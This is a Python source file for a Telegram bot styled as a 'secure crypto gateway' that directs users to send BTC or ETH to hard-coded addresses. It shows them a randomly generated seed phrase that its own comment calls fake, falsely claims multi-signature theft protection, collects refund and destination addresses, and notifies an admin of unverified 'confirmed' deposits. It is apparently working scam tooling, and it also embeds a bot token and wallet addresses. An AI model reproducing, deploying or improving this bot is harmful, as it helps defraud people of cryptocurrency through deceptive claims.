import json
import logging
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# === CONFIG ===
BOT_TOKEN = "7744583633:AAFdAkB-hO68tDMY0GwOBXh3trA8EI9ydSY"
ADMIN_CHAT_ID = 6190128347  # Replace with your Telegram numeric user ID
BTC_ADDRESS = "bc1q6d5t0pf08nu484wu6q3ju0u53cueyuu3xcp7w5"
ETH_ADDRESS = "0x35e9a327c3bB9B41BA00f1658A69D8086c30CB40"
DATA_FILE = "users.json"

# === LOGGING ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# === Load BIP39 Wordlist (Electrum-style) ===
with open("english.txt", "r") as f:
    WORDLIST = [word.strip() for word in f.readlines()]

# === HELPER FUNCTIONS ===
def load_users():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(DATA_FILE, "w") as f:
        json.dump(users, f, indent=2)

def generate_seed_phrase():
    return ' '.join(random.sample(WORDLIST, 12))

# === BOT HANDLERS ===
def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("🔶 BTC", callback_data='choose_btc')],
        [InlineKeyboardButton("🔷 ETH", callback_data='choose_eth')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text(
        "Welcome to our secure crypto gateway! 👋\n\n"
        "Please choose your preferred currency to proceed:",
        reply_markup=reply_markup
    )

def handle_currency_choice(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = str(query.from_user.id)
    username = query.from_user.username or "N/A"
    users = load_users()

    # Register user if not already
    if user_id not in users:
        users[user_id] = {
            "username": username,
            "refund_address": None,
            "confirmed": False,
            "destination": None,
            "currency": None
        }

    if query.data == "choose_btc":
        address = BTC_ADDRESS
        currency = "BTC"
    else:
        address = ETH_ADDRESS
        currency = "ETH"

    users[user_id]["currency"] = currency
    save_users(users)

    # Generate fake seed phrase
    seed = generate_seed_phrase()

    query.answer()
    query.edit_message_text(
        f"🪙 *{currency} Deposit Instructions*\n"
        f"Send your {currency} to the following address:\n\n"
        f"`{address}`\n\n"
        f"🔐 *Seed Phrase (Multi-Sig Simulation)*\n"
        f"`{seed}`\n\n"
        "🛡️ This is a multi-signature wallet setup to prevent theft and scams.",
        parse_mode=ParseMode.MARKDOWN
    )

def handle_message(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    msg = update.message.text.strip()
    users = load_users()

    if user_id not in users:
        update.message.reply_text("Please type /start first.")
        return

    user = users[user_id]

    if not user["refund_address"]:
        user["refund_address"] = msg
        save_users(users)
        update.message.reply_text("✅ Refund address saved. Once you've sent the deposit, type *confirm*", parse_mode=ParseMode.MARKDOWN)
    elif not user["confirmed"]:
        update.message.reply_text("⚠️ Type *confirm* to confirm deposit or send a destination address after confirming.", parse_mode=ParseMode.MARKDOWN)
    elif user["confirmed"] and not user["destination"]:
        user["destination"] = msg
        save_users(users)
        update.message.reply_text("✅ Destination address saved. Awaiting admin processing.")
        context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"🚨 New confirmed deposit!\nUser: @{user['username']}\nRefund: `{user['refund_address']}`\nDestination: `{user['destination']}`",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        update.message.reply_text("✅ You've already completed all steps. Wait for admin action.")

def confirm(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    users = load_users()

    if user_id not in users:
        update.message.reply_text("Please type /start first.")
        return

    users[user_id]["confirmed"] = True
    save_users(users)

    update.message.reply_text("✅ Deposit confirmed. Now send the *destination address* to forward the funds.", parse_mode=ParseMode.MARKDOWN)
    context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"🟢 @{users[user_id]['username']} has confirmed a deposit.\nRefund: `{users[user_id]['refund_address']}`",
        parse_mode=ParseMode.MARKDOWN
    )

def status(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_CHAT_ID:
        update.message.reply_text("Access denied.")
        return

    users = load_users()
    msg = "*User Status Report:*\n\n"

    for uid, info in users.items():
        msg += f"👤 @{info.get('username', 'N/A')} | ID: {uid}\n"
        msg += f"  - Refund: `{info.get('refund_address')}`\n"
        msg += f"  - Confirmed: {info.get('confirmed')}\n"
        msg += f"  - Destination: `{info.get('destination')}`\n\n"

    update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# === MAIN ===
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # === Command Handlers ===
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("confirm", confirm))
    dp.add_handler(CommandHandler("status", status))

    # === Inline Button Handler for BTC/ETH Selection ===
    dp.add_handler(CallbackQueryHandler(handle_currency_choice, pattern='^choose_'))

    # === Generic Text Handler ===
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # === Start the Bot ===
    updater.start_polling()
    logger.info("Bot is running...")
    updater.idle()

if __name__ == "__main__":
    main()
